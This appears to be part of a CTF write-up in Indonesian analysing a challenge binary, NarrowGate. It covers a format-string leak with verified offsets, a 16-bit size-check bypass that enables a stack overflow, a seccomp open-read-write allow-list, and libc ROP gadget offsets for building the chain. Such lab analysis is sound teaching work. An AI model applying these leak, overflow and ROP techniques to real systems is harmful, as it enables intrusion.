# NarrowGate — Analisis

[← Overview](38-narrowgate.md) · [Index](index.md)

### 2.1 `leaker()` — format string

```asm
11e9: leaker:
11ed: sub rsp, 0xb0
11f4: mov rax, fs:0x28
11fd: mov [rbp-0x8], rax          # canary
1203: lea rax, [rip+0xdfa]        # "name> "
1212: call printf
1217: mov rax, [stdout]
1221: call fflush
1226: mov rdx, [stdin]
122d: lea rax, [rbp-0xb0]         # buffer 0xb0
1234: mov esi, 0xa0               # fgets 0xa0 -> aman
123c: call fgets
...
1267: lea rax, [rip+0xd9f]        # "hello, "
1276: call printf
127b: lea rax, [rbp-0xb0]
128a: call printf                 # printf(nickname)
```

Format string, tanpa overflow di `leaker`. Indeks yang diverifikasi (`assets/narrowgate/03b-leak-probe.txt`):

```text
%27$p = hello, 0x8f084ec4da706800     # canary
%29$p = hello, 0x79c08f5b754b        # return ke main (PIE + 0x154b)
%43$p = hello, 0x7131a2629d90        # return main -> libc (libc + 0x29d90)
```

### 2.2 `main()` — validasi 16-bit

```asm
14fd: main:
1501: sub rsp, 0x60
1505: mov rax, fs:0x28
150e: mov [rbp-0x8], rax             # canary @ rbp-8
1514: mov rax, [stdout]
152d: call setvbuf
1532: call setup_seccomp
1537: puts("Narrow Gate")
1546: call leaker
154b: lea rax, [rip+0xaeb]            # "blocks(4 bytes)> "
155a: call printf
155f: lea rax, [rbp-0x5c]
1563: mov edx, 4
1568: mov rsi, rax
156b: mov edi, 0
1570: call read                       # blocks (uint32)
1575: mov eax, [rbp-0x5c]
1578: shl eax, 6                      # size = blocks * 64 (mod 2^32)
157b: sub eax, 1
157e: mov [rbp-0x58], eax
1581: mov eax, [rbp-0x58]
1584: cmp ax, 0x3f                    # <-- hanya 16 bit bawah!
1588: jbe 15a0
158a: puts("rejected")
1599: mov eax, 0
159e: jmp 15c2
15a0: mov eax, [rbp-0x5c]
15a3: shl eax, 6
15a6: mov [rbp-0x54], eax             # size penuh (32-bit)
15a9: mov edx, [rbp-0x54]             # size ke rdx (zero-extend)
15ac: lea rax, [rbp-0x50]             # buffer 0x50
15b0: mov rsi, rax
15b3: mov edi, 0
15b8: call read                       # read(0, rbp-0x50, size)
```

Pengecekan `cmp ax, 0x3f` hanya melihat 16 bit rendah dari `(blocks*64)-1`; nilai penuh `size` dipakai untuk `read`. Pilih `blocks` sehingga:

```text
blocks * 64 - 1  ≡  0x003f (mod 0x10000)
```

`blocks = 0x401 = 1025`:

```text
blocks * 64      = 0x401 * 0x40 = 0x10040 = 65600
blocks * 64 - 1  = 0x1003f
low 16 bits      = 0x003f  -> lolos (<= 0x3f)
size             = 0x10040 -> read besar
```

Layout stack:

```text
buf           rbp-0x50
canary        rbp-0x08   -> offset 0x48 (72)
saved rbp     rbp         -> 0x50
saved rip     rbp+0x08    -> 0x58
```

### 2.3 Seccomp — ORW only

`setup_seccomp()` membangun BPF secara manual dan memanggil:

```text
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog)
```

Allow-list (decode lengkap di `writeups/assets/narrowgate/02b-seccomp.txt`):

```text
read(0), write(1), open(2), close(3), lseek(8), fstat(5),
newfstatat(0x106), brk(0xc), exit(0x3c), exit_group(0xe7),
getrandom(0x13e)
default: KILL (0x80000000)
```

Yang **tidak** diizinkan: `execve`, `openat(0x101)`, `pread64(0x11)`. Karena glibc `open()` dapat memakai `openat` di belakang layar, exploit memakai **raw syscall open** (`rax=2`). Untuk memindahkan fd dari `rax` ke `rdi`, dipakai gadget misaligned `xchg edi, eax ; ret`.

### 2.4 Gadget (libc 2.35 bawaan)

| Gadget | Offset |
|---|---|
| `pop rdi ; ret` | `0x2a3e5` |
| `pop rsi ; ret` | `0x2be51` |
| `pop rdx ; pop rbx ; ret` | `0x90469` |
| `pop rax ; ret` | `0x45eb0` |
| `syscall ; ret` | `0x114289` |
| `xchg edi, eax ; ret` (misaligned) | `0x164f5e` |
| `ret` | `0x29cd6` |

`0x164f5e` berada di tengah instruksi `seta bl` (`0f 97 c3`): mulai dari byte `97 c3` menjadi `xchg edi,eax; ret`.

### 2.5 Area writable untuk path/output

Dipakai halaman writable di sekitar libc:

```text
RW_PATH = libc + 0x224000     # path file
RW_OUT  = libc + 0x224100     # buffer output
```

Pada proses uji, `libc+0x224000` jatuh di mapping `rw-p` anonim tepat setelah segmen RW libc (dikonfirmasi `/proc/<pid>/maps`), sehingga aman untuk `read`/`write` ROP.
